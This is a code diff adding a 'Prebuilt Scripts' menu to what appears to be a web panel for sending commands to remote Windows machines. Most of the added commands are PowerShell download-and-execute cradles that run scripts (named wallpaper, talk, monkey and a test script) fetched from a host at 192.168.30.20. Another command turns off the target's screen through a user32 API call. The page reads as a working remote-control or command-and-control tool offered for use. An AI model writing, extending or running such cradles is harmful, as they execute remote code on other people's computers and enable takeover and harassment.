@@ -46,6 +46,52 @@
                 });
             }
         }
+
+    // Function to populate the command input field
+    function populateCommand(script) {
+        const commandInput = document.getElementById('commandInput');
+        commandInput.value = script;
+    }
+
+    // Function to dynamically create prebuilt script buttons
+    function createPrebuiltScriptButtons() {
+        const scripts = [
+            {
+                name: 'Test Script',
+                command: 'Invoke-Expression ( [System.Text.Encoding]::UTF8.GetString((Invoke-WebRequest -Uri "http://192.168.30.20:5000/static/scripts/script.ps1").Content) )'
+            },
+            {
+                name: 'Wallpaper Script',
+                command: 'Invoke-Expression ( [System.Text.Encoding]::UTF8.GetString((Invoke-WebRequest -Uri "http://192.168.30.20:5000/static/scripts/wallpaper.ps1").Content) )'
+            },
+            {
+                name: 'Talk',
+                command: 'Invoke-Expression ( [System.Text.Encoding]::UTF8.GetString((Invoke-WebRequest -Uri "http://192.168.30.20:5000/static/scripts/talk.ps1").Content) )'
+            },
+            {
+                name: 'Monkey',
+                command: 'Invoke-Expression ( [System.Text.Encoding]::UTF8.GetString((Invoke-WebRequest -Uri "http://192.168.30.20:5000/static/scripts/monkey.ps1").Content) )'
+            },
+            {
+                name: 'Turn off screen',
+                command: "(Add-Type '[DllImport(\"user32.dll\")]public static extern int SendMessage(int hWnd, int hMsg, int wParam, int lParam);' -Name a -Pas)::SendMessage(-1,0x0112,0xF170,2)"
+            }
+            // Add more scripts here if needed
+        ];
+
+        const prebuiltScriptsContainer = document.getElementById('prebuiltScripts');
+
+        scripts.forEach(script => {
+            const button = document.createElement('button');
+            button.textContent = script.name;
+            button.className = 'px-4 py-2 bg-blue-600 text-white rounded-lg hover:bg-blue-700 text-sm font-semibold';
+            button.onclick = () => populateCommand(script.command);
+            prebuiltScriptsContainer.appendChild(button);
+        });
+    }
+
+    // Initialize prebuilt script buttons on page load
+    document.addEventListener('DOMContentLoaded', createPrebuiltScriptButtons);
     </script>
 </head>
 <body class="bg-gray-900 text-gray-100">
@@ -110,6 +156,10 @@
                 <!-- Command Input Form -->
                 <div class="mt-6">
                     <h3 class="text-xl font-semibold text-white">Send Command</h3>
+                    <div class="mt-6">
+                        <h5 class="text-sm font-semibold text-white">Prebuilt Scripts</h5>
+                        <div id="prebuiltScripts" class="mt-4 flex flex-wrap gap-4"></div>
+                    </div>
                     <form id="commandForm" onsubmit="submitCommandForm(event)">
                         <div class="mt-4 flex items-center">
                             <label for="commandInput" class="text-sm text-gray-300 mr-4">Command:</label>
